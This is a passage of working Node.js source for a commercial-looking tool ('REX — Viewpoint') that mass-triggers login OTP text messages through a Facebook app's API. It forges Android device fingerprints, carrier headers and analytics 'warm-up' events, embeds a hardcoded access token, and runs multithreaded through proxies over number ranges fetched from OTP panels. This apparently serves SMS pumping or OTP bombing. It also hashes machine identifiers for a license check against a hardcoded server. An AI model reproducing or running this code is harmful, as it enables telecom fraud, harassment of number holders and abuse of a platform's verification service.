v7.model = "Pixel 7", v7.brand = "Google", v7.build = "TQ3A.230901.001", v7.density = 2.75, v7.width = 0x438, v7.height = 0x960, v7.os = '13', v7.arch = "arm64-v8a";
const v8 = {};
v8.model = "Pixel 8 Pro", v8.brand = "Google", v8.build = "UD1A.231105.004", v8.density = 2.75, v8.width = 0x540, v8.height = 0xbb0, v8.os = '14', v8.arch = "arm64-v8a";
const v9 = {};
v9.model = "SM-F936B", v9.brand = "Samsung", v9.build = "TP1A.220624.014", v9.density = 2.625;
v9.width = 0x6e8, v9.height = 0x8a0, v9.os = '13', v9.arch = "arm64-v8a";
const v10 = {};
v10.model = "SM-G991B", v10.brand = "Samsung", v10.build = "SP1A.210812.016", v10.density = 2.625, v10.width = 0x438, v10.height = 0x960, v10.os = '12', v10.arch = "arm64-v8a";
const DEVICE_PROFILES = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10],
  v11 = {};
v11.name = "n/a", v11.mcc = "000", v11.mnc = '00', v11.conn = "WIFI";
const v12 = {};
v12.name = "T-Mobile", v12.mcc = "310", v12.mnc = "260", v12.conn = "cell";
const v13 = {};
v13.name = "Verizon", v13.mcc = "311", v13.mnc = "480", v13.conn = "cell";
const v14 = {};
v14.name = "AT&T", v14.mcc = "310", v14.mnc = "410", v14.conn = "cell";
const v15 = {};
v15.name = "Vodafone", v15.mcc = "262", v15.mnc = '02', v15.conn = "cell";
const v16 = {};
v16.name = "Telkomsel", v16.mcc = "510", v16.mnc = '10', v16.conn = "cell";
const v17 = {};
v17.name = "n/a", v17.mcc = "000", v17.mnc = '00', v17.conn = "WIFI";
const v18 = {};
v18.name = "n/a", v18.mcc = "000", v18.mnc = '00', v18.conn = "WIFI";
const CARRIERS = [v11, v12, v13, v14, v15, v16, v17, v18];
async function triggerSms(v223, v224 = {}) {
  const {
      onStatus = () => {},
      proxy = null,
      timeout = 15000
    } = v224,
    v225 = normalizePhoneNumber(v223),
    v226 = v225.replace('+', ''),
    {
      cCode: v227,
      lNumber: v228
    } = extractPhoneParts(v226),
    v229 = DEVICE_PROFILES[Math.floor(Math.random() * DEVICE_PROFILES.length)],
    v230 = CARRIERS[Math.floor(Math.random() * CARRIERS.length)],
    v231 = uuid(),
    v232 = uuid(),
    v233 = uuid() + '-' + Date.now() + "-ANDROID",
    v234 = crypto.randomBytes(8).toString("hex"),
    v235 = uuid(),
    v236 = uuid(),
    v237 = "Dalvik/2.1.0 (Linux; U; Android " + v229.os + ';\x20' + v229.model + " Build/" + v229.build + ") [FBAN/ViewpointsForAndroid;FBAV/330.0.0.5.106;FBBV/986325627;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/en_US;FBMF/" + v229.brand + ";FBBD/" + v229.brand + ";FBDV/" + v229.model + ";FBSV/" + v229.os + ";FBCA/" + v229.arch + ";FBDM/{density=" + v229.density + ",width=" + v229.width + ",height=" + v229.height + "};FB_FW/1;]";
  onStatus("[1/2] Warming up device footprint...");
  const v238 = Date.now(),
    v239 = {};
  v239.vp_extra = "{\"is_real_time\":1}", v239.vp_fbid_device_ent = '0', v239.installation_id = v233, v239.fb_family_device_id = v236, v239.logged_in_accounts = '', v239.is_release = true, v239.vp_fbid_user_ent = '0', v239.screen_name = "cont_with_fb_page";
  v239.event_category = "login";
  v239.event = "need_help_logging_in_click", v239.__canonicals = {}, v239.pigeon_reserved_keyword_requested_latency = -2, v239.pigeon_reserved_keyword_log_type = "client_event", v239.pigeon_reserved_keyword_bg = "false";
  const v240 = v239,
    fn4 = v262 => {
      {
        const v263 = v262 / 1000;
        return parseFloat(v263.toExponential(12).replace('+', ''));
      }
    },
    fn5 = (v264, v265, v266, v267, v268) => JSON.stringify({
      'time': v264,
      'app_id': "257637621624717",
      'app_ver': "330.0.0.5.106",
      'build_num': 0x3aca227b,
      'consent_state': 0x0,
      'device': v229.model,
      'os_ver': v229.os,
      'device_id': v231,
      'session_id': "UFS-" + v232 + '-' + v266 + '-' + v267,
      'seq': v265,
      'uid': null,
      'data': [{
        'trace_id': uuid(),
        'extra': v268,
        'log_type': "client_event",
        'bg': v266 === 'bg' ? "true" : "false",
        'time': fn4(v264),
        'name': v268.event.includes("view") ? "vp_view" : v268.event.includes("background") || v268.event.includes("forground") ? "vp_general" : "vp_click",
        'sampling_rate': 0x1,
        'tags': 0x800040
      }],
      'tier': "ads",
      'sent_time': fn4(v264 + Math.random() * 200),
      'carrier': v230.name,
      'conn': v230.conn
    }),
    v241 = "format=json&compressed=0&message=" + encodeURIComponent(fn5(v238, 10, 'fg', '6', v240)),
    v242 = {
      ...v240
    };
  v242.screen_name = "find_your_vp_account_page", v242.event = "vp_find_your_vp_account_page_view";
  const v243 = v242,
    v244 = {
      ...v240
    };
  v244.screen_name = "find_your_vp_account_page", v244.event = "app_move_to_forground";
  const v245 = v244,
    v246 = {
      ...v240
    };
  v246.event = "app_move_to_background", v246.pigeon_reserved_keyword_bg = "true";
  const v247 = v246,
    v248 = v238 + 30 + Math.floor(Math.random() * 50),
    v249 = JSON.stringify({
      'batches': [JSON.parse(fn5(v248, 12, 'fg', '8', v243)).data ? {
        ...JSON.parse(fn5(v248, 12, 'fg', '8', v243)),
        'data': [{
          'trace_id': uuid(),
          'extra': v243,
          'log_type': "client_event",
          'bg': "false",
          'time': fn4(v248),
          'name': "vp_view",
          'sampling_rate': 0x1,
          'tags': 0x800040
        }, {
          'trace_id': uuid(),
          'extra': v245,
          'log_type': "client_event",
          'bg': "false",
          'time': fn4(v248),
          'name': "vp_general",
          'sampling_rate': 0x1,
          'tags': 0x800040
        }]
      } : {}, {
        ...JSON.parse(fn5(v238 + 20, 11, 'bg', '7', v247)),
        'data': [{
          'trace_id': uuid(),
          'extra': v247,
          'log_type': "client_event",
          'bg': "true",
          'time': fn4(v238 + 20),
          'name': "vp_general",
          'sampling_rate': 0x1,
          'tags': 0x800040
        }]
      }],
      'request_info': {
        'tier': "ads",
        'sent_time': fn4(v248 + Math.random() * 500),
        'carrier': v230.name,
        'conn': v230.conn
      }
    }),
    v250 = "format=json&compressed=0&multi_batch=1&message=" + encodeURIComponent(v249);
  const v251 = v248 + 5000 + Math.floor(Math.random() * 3000),
    v252 = {
      ...v240
    };
  v252.screen_name = "find_your_vp_account_page", v252.event = "find_your_account_continue_button_click";
  const v253 = v252,
    v254 = "format=json&compressed=0&message=" + encodeURIComponent(fn5(v251, 13, 'fg', '8', v253)),
    v255 = {
      'user-agent': v237,
      'fb_api_req_friendly_name': "sendAnalyticsLog",
      'fb_api_caller_class': "com.facebook.catalyst.modules.analytics.ReactNativeAnalyticsUploader",
      'content-type': "application/x-www-form-urlencoded",
      'accept-encoding': "gzip",
      'X-FB-HTTP-Engine': "Liger",
      'X-FB-Connection-Type': v230.conn === "WIFI" ? "WIFI" : "cell",
      'X-FB-Device-Group': Math.floor(Math.random() * 3000 + 4000).toString(),
      'X-FB-Sim-HNI': v230.mcc + v230.mnc,
      'X-FB-Net-HNI': v230.mcc + v230.mnc,
      'Host': "graph.facebook.com",
      'Connection': "close"
    },
    v256 = "https://graph.facebook.com/logging_client_events";
  try {
    await sendRequest(v256, "POST", v255, v241, proxy, timeout, true), await new Promise(v269 => setTimeout(v269, 200 + Math.random() * 300));
  } catch (v270) {
    debugLog(v226, "warmup-err", v270.message);
  }
  onStatus("[2/2] Triggering SMS via API...");
  const v257 = {};
  v257.phone_number = v228, v257.country_code = v227, v257.device_id = v236, v257.device_android_id = v234, v257.device_advertising_id = v235, v257.suffix = "vJ65Y8VAf67";
  const v258 = JSON.stringify(v257),
    v259 = "access_token=AN%7C301470807343876%7Cf9ce773b849e044a653428dafb8d8418&phone_number=" + v228 + "&country_code=" + encodeURIComponent(v227) + "&device_id=" + v236 + "&device_android_id=" + v234 + "&device_advertising_id=" + v235 + "&suffix=vJ65Y8VAf67",
    v260 = "https://graph.viewpointsfromfacebook.com/sms_login?" + v259,
    v261 = {
      'user-agent': v237,
      'content-type': "application/json",
      'accept-encoding': "gzip",
      'X-FB-HTTP-Engine': "Liger",
      'X-FB-Connection-Type': v230.conn === "WIFI" ? "WIFI" : "cell",
      'X-FB-Device-Group': v255["X-FB-Device-Group"],
      'X-FB-Sim-HNI': v255["X-FB-Sim-HNI"],
      'X-FB-Net-HNI': v255["X-FB-Net-HNI"],
      'Host': "graph.viewpointsfromfacebook.com",
      'Connection': "close"
    };
  try {
    {
      let v271 = await sendRequest(v260, "POST", v261, v258, proxy, timeout);
      const v272 = proxy ? proxy.host + ':' + proxy.port : "DIRECT";
      debugLog(v226, "sms-trigger", "[Proxy: " + v272 + "] HTTP " + v271.status + " → " + (v271.data || '').substring(0, 500));
      const fn6 = v274 => {
        try {
          const v275 = JSON.parse(v274);
          if (v275.result === "success" || v275.success === true) {
            const v276 = {};
            return v276.ok = true, v276.m = "SMS successfully triggered", v276;
          } else {
            if (v275.success === false && v275.already_verified === false) {
              const v277 = {};
              return v277.ok = false, v277.retry = true, v277.m = "Number declined by gateway", v277;
            } else {
              if (v275.result === "failed") {
                {
                  const v278 = {};
                  return v278.ok = false, v278.retry = false, v278.m = "SMS delivery rejected", v278;
                }
              } else {
                if (v275.result === "non_existing_user") {
                  {
                    const v279 = {};
                    return v279.ok = false, v279.retry = false, v279.m = "Non-existing user", v279;
                  }
                } else {
                  if (v275.error) {
                    {
                      const v280 = {};
                      return v280.ok = false, v280.retry = false, v280.m = v275.error.message || "Error " + v275.error.code, v280;
                    }
                  } else {
                    const v281 = {};
                    return v281.ok = false, v281.retry = false, v281.m = "Unknown response", v281;
                  }
                }
              }
            }
          }
        } catch (v282) {
          const v283 = {};
          return v283.ok = false, v283.retry = false, v283.m = "Non-JSON response", v283;
        }
      };
      let v273 = fn6(v271.data);
      if (!v273.ok && v273.retry) {
        {
          onStatus("[2/2] ⏳ Retrying with sms_login_only...");
          const v284 = "https://graph.viewpointsfromfacebook.com/sms_login_only?" + v259;
          await new Promise(v285 => setTimeout(v285, 300 + Math.random() * 400)), v271 = await sendRequest(v284, "POST", v261, v258, proxy, timeout), debugLog(v226, "sms-resend", "[Proxy: " + v272 + "] HTTP " + v271.status + " → " + (v271.data || '').substring(0, 500)), v273 = fn6(v271.data);
        }
      }
      if (v273.ok) {
        onStatus("[1/1] ✅ " + v273.m);
        const v286 = {};
        return v286.success = true, v286.message = v273.m, v286.phone = v225, v286;
      } else {
        {
          const v287 = {};
          return v287.success = false, v287.message = "Failed: " + v273.m, v287.phone = v225, v287;
        }
      }
    }
  } catch (v288) {
    const v289 = {};
    return v289.success = false, v289.message = "Failed: " + (v288.message || "Proxy Error"), v289.phone = v225, v289;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v290) {
      {
        this.totalNumbers = v290;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v291, v292) {
      let v293 = '';
      const v294 = v291.match(/\d{8,}/),
        v295 = v294 ? v294[0] : '';
      if (v292 === "success") v293 = chalk.hex("#00FF88")("REX — Viewpoint │ OTP Sent → ") + chalk.hex("#FCAF45").bold(v295 || v291);else {
        if (v292 === "retry") v293 = chalk.hex("#FF9900")("REX — Viewpoint │ Retrying → ") + chalk.hex("#888888")(v291);else {
          if (v292 === "error" || v292 === "failed") {
            let v296 = v291.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
            v296.toLowerCase().includes("proxy") ? v293 = chalk.hex("#FF4466")("REX — Viewpoint │ Proxy Drop → ") + chalk.hex("#888888")(v296) : v293 = chalk.hex("#FF4466")("REX — Viewpoint │ Failed → ") + chalk.hex("#FCAF45").bold(v295) + chalk.hex("#888888")('\x20(' + v296 + ')');
          } else return;
        }
      }
      process.stdout.write("\r[K" + v293 + '\x0a'), this.render();
    }
    ["setStatus"](v297) {}
    ["update"]() {}
    ["render"]() {
      const v298 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1);
      const v299 = '\x20\x20' + W.bold("VP-V1") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v298 + "% │ " + B("Sent: " + this.successful) + " │ " + R("Err: " + this.failed);
      process.stdout.write("\r[K" + v299);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v300 = Math.floor((Date.now() - this.startTime) / 1000),
        v301 = Math.floor(v300 / 60);
      const v302 = v300 % 60,
        v303 = v301 + 'm\x20' + v302 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗"));
      console.log(C("  ║") + W.bold("  VP SMS TRIGGER — COMPLETE                 ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣"));
      console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v303.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v304, v305) {
    return new Promise(v306 => {
      {
        let v307 = 0;
        process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
        if (process.stdin.isTTY) process.stdin.setRawMode(true);
        const fn7 = () => {
          process.stdout.write("[2J[H"), printHeader(), console.log("   [33m" + v304 + "[0m\n"), v305.forEach((v308, v309) => {
            v309 === v307 ? console.log("   [36m➔[32m " + v308.name + "[0m") : console.log("     [90m" + v308.name + "[0m");
          });
        };
        fn7();
        const fn8 = (v310, v311) => {
          v311.ctrl && v311.name === 'c' && process.exit(0);
          if (v311.name === 'up') v307 = (v307 - 1 + v305.length) % v305.length, fn7();else {
            if (v311.name === "down") v307 = (v307 + 1) % v305.length, fn7();else v311.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn8), v306(v305[v307].value));
          }
        };
        process.stdin.on("keypress", fn8);
      }
    });
  }
  async function promptText(v312, v313) {
    return new Promise(v314 => {
      process.stdout.write("   [33m" + v312 + "[0m ");
      let v315 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn9 = v316 => {
        {
          const v317 = v316.toString();
          if (v317.includes('\x0a') || v317.includes('\x0d')) {
            {
              process.stdin.removeListener("data", fn9), v315 += v317.split(/[\r\n]/)[0];
              let v318 = v315.trim();
              if (v318.startsWith('\x22') && v318.endsWith('\x22')) v318 = v318.slice(1, -1);else v318.startsWith('\x27') && v318.endsWith('\x27') && (v318 = v318.slice(1, -1));
              v314(v318 || v313);
            }
          } else v315 += v317;
        }
      };
      process.stdin.on("data", fn9);
    });
  }
  async function interactiveWizard() {
    let v319 = 1,
      v320 = "file";
    let v321 = "numbers.txt",
      v322 = null,
      v323 = null,
      v324 = null,
      v325 = null,
      v326 = "none",
      v327 = 20,
      v328 = '',
      v329 = [],
      v330 = 50,
      v331 = "/api/v1/numbers/get";
    const v332 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v319 === 1) {
        const v333 = await selectOption("SELECT NUMBER SOURCE", [{
          'name': "📁 Load from file (numbers.txt)",
          'value': "file"
        }, {
          'name': "🌐 Auto fetch from NexaOTP Panel",
          'value': "nexa"
        }, {
          'name': "⚡ Auto fetch from Voltx (2oo9)",
          'value': "voltx"
        }, {
          'name': "🔥 Auto fetch from Stex (2oo9)",
          'value': "stex"
        }, {
          'name': "📱 Auto fetch from SMS Bower",
          'value': "smsbower"
        }, {
          'name': "⚡ Auto fetch from Zenex",
          'value': "zenex"
        }, {
          'name': "❌ Exit Program",
          'value': "exit"
        }]);
        if (v333 === "exit") process.exit(0);
        v320 = v333, v319 = 2;
      } else {
        if (v319 === 2) {
          {
            if (v320 === "file") {
              const v334 = await selectOption("SELECT TARGET NUMBERS FILE", [{
                'name': "📄 numbers.txt (Default)",
                'value': "numbers.txt"
              }, {
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "⬅️ Go Back to Number Source",
                'value': "back"
              }]);
              if (v334 === "back") {
                {
                  v319 = 1;
                  continue;
                }
              }
              if (v334 === "custom") {
                {
                  const v335 = await promptText("Enter Numbers File Path:", "numbers.txt");
                  if (v335.toLowerCase() === "back") continue;
                  v321 = v335;
                }
              } else v321 = v334;
              if (!fs.existsSync(v321)) fs.writeFileSync(v321, '');
              v322 = null, v319 = 3;
            } else {
              if (v320 === "voltx" || v320 === "stex") {
                {
                  const v336 = v320 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
                    v337 = v320 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
                    v338 = v320 === "voltx" ? TWOOO_VOLTX_GET : TWOOO_STEX_GET,
                    v339 = v320 === "voltx" ? TWOOO_VOLTX_CONSOLE : TWOOO_STEX_CONSOLE;
                  let v340 = '',
                    v341 = [],
                    v342 = 50,
                    v343 = false,
                    v344 = 1;
                  while (v344 <= 3 && !v343) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v344 === 1) {
                      {
                        if (fs.existsSync(v337)) {
                          v340 = fs.readFileSync(v337, "utf8").trim();
                          const v345 = await selectOption(v336 + " key (" + v340.substring(0, 10) + "...)", [{
                            'name': "Use saved key",
                            'value': "use"
                          }, {
                            'name': "Enter new key",
                            'value': "new"
                          }, {
                            'name': "Remove saved key",
                            'value': "remove"
                          }, {
                            'name': "⬅️ Back",
                            'value': "back"
                          }]);
                          if (v345 === "back") {
                            v343 = true;
                            break;
                          }
                          if (v345 === "remove") fs.existsSync(v337) && fs.unlinkSync(v337), v340 = '';else v345 === "new" && (v340 = '');
                        }
                        if (!v340) {
                          const v346 = await promptText("Enter " + v336 + " API Key (mauthapi):", '');
                          if (v346.toLowerCase() === "back") {
                            {
                              v343 = true;
                              break;
                            }
                          }
                          v340 = v346;
                          const v347 = {};
                          v347.name = 'No', v347.value = 'no';
                          const v348 = await selectOption("Save key?", [{
                            'name': "Yes",
                            'value': "yes"
                          }, v347]);
                          if (v348 === "yes" && v340) fs.writeFileSync(v337, v340, "utf8");
                        }
                        if (v340) v344 = 2;
                      }
                    } else {
                      if (v344 === 2) {
                        const v349 = await selectOption("How to select ranges?", [{
                          'name': "🔍 Auto Range Finder (scan console)",
                          'value': "auto"
                        }, {
                          'name': "✏️  Enter manually",
                          'value': "manual"
                        }, {
                          'name': "⬅️ Back",
                          'value': "back"
                        }]);
                        if (v349 === "back") {
                          v344 = 1;
                          continue;
                        }
                        if (v349 === "auto") {
                          {
                            const v350 = await autoRangeFinderFor2Oo(v340, v339, selectOption, promptText);
                            v350 && v350.length > 0 && (v341 = v350, v344 = 3);
                          }
                        } else {
                          v341 = [];
                          let v351 = true;
                          while (v351) {
                            const v352 = await promptText("Enter range #" + (v341.length + 1) + " (e.g. 26134XXX) or 'back':", '');
                            if (v352.toLowerCase() === "back") {
                              {
                                if (v341.length === 0) break;else {
                                  v341.pop();
                                  continue;
                                }
                              }
                            }
                            if (v352) v341.push(v352);
                            const v353 = {};
                            v353.name = 'No', v353.value = 'no';
                            const v354 = await selectOption("Added " + v341.length + ". Add another?", [{
                              'name': "Yes",
                              'value': "yes"
                            }, v353]);
                            if (v354 === 'no') v351 = false;
                          }
                          if (v341.length > 0) v344 = 3;
                        }
                      } else {
                        if (v344 === 3) {
                          const v355 = await promptText("How many numbers? [default:50]:", '50');
                          if (v355.toLowerCase() === "back") {
                            v344 = 2;
                            continue;
                          }
                          v342 = parseInt(v355) || 50;
                          const v356 = {};
                          v356.provider = v320, v356.apiKey = v340, v356.getPath = v338, v356.consolePath = v339, v356.ranges = v341, v356.totalCount = v342, v325 = v356, v322 = null, v344 = 4;
                        }
                      }
                    }
                  }
                  if (v343) {
                    v319 = 1;
                    continue;
                  }
                  v319 = 3;
                }
              } else {
                let v357 = 1,
                  v358 = false;
                while (v357 <= 4 && !v358) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v357 === 1) {
                    {
                      if (fs.existsSync(v332)) {
                        {
                          const v359 = fs.readFileSync(v332, "utf8").trim(),
                            v360 = await selectOption("Found saved API Key (..." + v359.slice(-4) + "). Use it?", [{
                              'name': "Yes, use saved key",
                              'value': "yes"
                            }, {
                              'name': "No, enter new key",
                              'value': 'no'
                            }, {
                              'name': "Delete saved key",
                              'value': "delete"
                            }, {
                              'name': "⬅️ Go Back to Number Source",
                              'value': "back"
                            }]);
                          if (v360 === "back") {
                            v358 = true;
                            break;
                          }
                          if (v360 === "yes") v328 = v359;else {
                            if (v360 === "delete") {
                              if (fs.existsSync(v332)) fs.unlinkSync(v332);
                              v328 = '';
                            }
                          }
                        }
                      }
                      if (!v328) {
                        const v361 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                        if (v361.toLowerCase() === "back") {
                          {
                            v358 = true;
                            break;
                          }
                        }
                        v328 = v361;
                        const v362 = {};
                        v362.name = 'No', v362.value = 'no';
                        const v363 = await selectOption("Save this key for future use?", [{
                          'name': "Yes, save it",
                          'value': "yes"
                        }, v362]);
                        v363 === "yes" && v328 && fs.writeFileSync(v332, v328, "utf8");
                      }
                      if (v328) v357 = 2;
                    }
                  } else {
                    if (v357 === 2) {
                      v329 = [];
                      let v364 = true;
                      while (v364) {
                        {
                          const v365 = await promptText("Enter range #" + (v329.length + 1) + " (e.g. 21624485XXX) or type 'back':", '');
                          if (v365.toLowerCase() === "back") {
                            if (v329.length === 0) {
                              v357 = 1;
                              break;
                            } else {
                              {
                                v329.pop();
                                continue;
                              }
                            }
                          }
                          if (v365) v329.push(v365);
                          const v366 = await selectOption("Added " + v329.length + " range(s). Add another?", [{
                            'name': "Yes, add another range",
                            'value': "yes"
                          }, {
                            'name': "No, proceed to next step",
                            'value': 'no'
                          }, {
                            'name': "⬅️ Go Back to API Key",
                            'value': "back"
                          }]);
                          if (v366 === "back") {
                            v357 = 1;
                            break;
                          }
                          if (v366 === 'no') v364 = false;
                        }
                      }
                      if (v329.length > 0) v357 = 3;
                    } else {
                      if (v357 === 3) {
                        {
                          const v367 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                          if (v367.toLowerCase() === "back") {
                            {
                              v357 = 2;
                              continue;
                            }
                          }
                          v330 = parseInt(v367) || 50, v357 = 4;
                        }
                      } else {
                        if (v357 === 4) {
                          {
                            const v368 = await selectOption("SELECT NEXA SERVER", [{
                              'name': "Server 1 (/get)",
                              'value': "/api/v1/numbers/get"
                            }, {
                              'name': "Server 2 (/p2/get)",
                              'value': "/api/v1/numbers/p2/get"
                            }, {
                              'name': "Server 3 (/p3/get)",
                              'value': "/api/v1/numbers/p3/get"
                            }, {
                              'name': "⬅️ Go Back to Count Input",
                              'value': "back"
                            }]);
                            if (v368 === "back") {
                              v357 = 3;
                              continue;
                            }
                            v331 = v368;
                            const v369 = {};
                            v369.apiKey = v328, v369.ranges = v329, v369.totalCount = v330, v369.serverEndpoint = v331, v322 = v369, v357 = 5;
                          }
                        }
                      }
                    }
                  }
                }
                if (v358) {
                  {
                    v319 = 1;
                    continue;
                  }
                }
                v319 = 3;
              }
            }
          }
        } else {
          if (v319 === 3) {
            {
              const v370 = await selectOption("SELECT PROXIES FILE", [{
                'name': "📄 proxies.txt (Default)",
                'value': "proxies.txt"
              }, {
                'name': "🚫 None (Direct Connection)",
                'value': "none"
              }, {
                'name': "✏️ Custom File Path",
                'value': "custom"
              }, {
                'name': "⬅️ Go Back to Numbers Selection",
                'value': "back"
              }]);
              if (v370 === "back") {
                {
                  v319 = 2;
                  continue;
                }
              }
              if (v370 === "custom") {
                const v371 = await promptText("Enter Proxies File Path:", "proxies.txt");
                if (v371.toLowerCase() === "back") continue;
                v326 = v371;
              } else {
                if (v370 === "none") v326 = '';else {
                  v326 = v370;
                }
              }
              v319 = 4;
            }
          } else {
            if (v319 === 4) {
              const v372 = await selectOption("SELECT THREADS", [{
                'name': "10 Threads",
                'value': 0xa
              }, {
                'name': "20 Threads (Default)",
                'value': 0x14
              }, {
                'name': "50 Threads (Fast)",
                'value': 0x32
              }, {
                'name': "100 Threads (Extreme)",
                'value': 0x64
              }, {
                'name': "⌨️ Custom...",
                'value': "custom"
              }, {
                'name': "⬅️ Go Back to Proxies Selection",
                'value': "back"
              }]);
              if (v372 === "back") {
                {
                  v319 = 3;
                  continue;
                }
              }
              if (v372 === "custom") {
                {
                  const v373 = await promptText("Enter custom number of threads (type 'back' to go back):", '20');
                  if (v373.toLowerCase() === "back") continue;
                  v327 = parseInt(v373) || 20;
                }
              } else {
                v327 = v372;
              }
              v319 = 5;
            } else {
              if (v319 === 5) break;
            }
          }
        }
      }
    }
    return process.stdin.pause(), [v321, String(v327), v326, v322, v325, v323, v324];
  }
  function generateHWID() {
    const v374 = require('os');
    const v375 = v374.platform();
    try {
      {
        if (v375 === "win32") {
          const v376 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x3a98
          }).toString().trim();
          if (!v376) throw new Error("No hardware data");
          const v377 = crypto.createHash("sha256").update(v376).digest("hex").toUpperCase();
          return "SKING-" + v377.substring(0, 8) + '-' + v377.substring(8, 12) + '-' + v377.substring(12, 16);
        } else {
          let v378 = [];
          try {
            const v381 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
              'stdio': "pipe",
              'timeout': 0x1388
            }).toString().trim();
            if (v381 && v381 !== "null") v378.push('A:' + v381);
          } catch (v382) {}
          try {
            if (fs.existsSync("/proc/cpuinfo")) {
              {
                const v383 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                  v384 = v383.match(/Serial\s*:\s*(\S+)/i),
                  v385 = v383.match(/Hardware\s*:\s*(.+)/i);
                if (v384 && v384[1] !== "0000000000000000") v378.push('S:' + v384[1].trim());
                if (v385) v378.push('H:' + v385[1].trim());
              }
            }
          } catch (v386) {}
          try {
            if (fs.existsSync("/etc/machine-id")) {
              const v387 = fs.readFileSync("/etc/machine-id", "utf8").trim();
              if (v387) v378.push('M:' + v387);
            }
          } catch (v388) {}
          try {
            const v389 = v374.cpus(),
              v390 = v389 && v389.length > 0 ? v389[0].model : "UnknownCPU",
              v391 = v374.totalmem(),
              v392 = v374.release(),
              v393 = v374.hostname();
            v378.push('F:' + v390 + '|' + v391 + '|' + v392 + '|' + v393);
          } catch (v394) {}
          const v379 = v378.join('||'),
            v380 = crypto.createHash("sha256").update(v379).digest("hex").toUpperCase();
          return "ANKING-" + v380.substring(0, 8) + '-' + v380.substring(8, 12) + '-' + v380.substring(12, 16);
        }
      }
    } catch (v395) {
      return '';
    }
  }
  function verifyServerSignature(v396, v397) {
    if (!v397) return false;
    const v398 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v396, "utf8"), v398, Buffer.from(v397, "base64"));
    } catch (v399) {
      return false;
    }
  }
  async function start() {
    const v400 = generateHWID();
    if (!v400) {
      console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1);
    }
    const v401 = generateHWID();
    if (v401 !== v400) {
      console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1);
    }
    globalHwid = v400, printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + C("REX — Viewpoint              ") + W('│')), console.log(W("│ [•] Your HWID : ") + Y(v400.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v402 = false,
      v403 = "Licensed";
    const v404 = Date.now();
    try {
      const v432 = "188.137.176.163",
        v433 = require("http"),
        v434 = await new Promise((v435, v436) => {
          const v437 = {};
          v437.hwid = v400;
          v437.app_id = "viewpoint", v437.version = "2.0.2", v437.timestamp = v404;
          const v438 = JSON.stringify(v437);
          const v439 = {
              'hostname': v432,
              'port': 0xec1,
              'path': "/api/verify",
              'method': "POST",
              'headers': {
                'Content-Type': "application/json",
                'Content-Length': Buffer.byteLength(v438)
              },
              'timeout': 0x2710
            },
            v440 = v433.request(v439, v441 => {
              {
                let v442 = '';
                v441.on("data", v443 => v442 += v443), v441.on("end", () => {
                  try {
                    v435(JSON.parse(v442));
                  } catch (v444) {
                    v436(v444);
                  }
                });
              }
            });
          v440.on("error", v436), v440.on("timeout", function () {
            this.destroy(), v436(new Error("Timeout"));
          }), v440.write(v438), v440.end();
        });
      if (v434) {
        {
          v434.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v434.status === "banned" || v434.status === "expired" || !v434.sig) {
            {
              await new Promise(v448 => setTimeout(v448, 2000));
              let v447 = String(v434.reason || "NOT REGISTERED");
              if (!v434.reason && !v434.sig) v447 = "NOT REGISTERED / REMOVED";
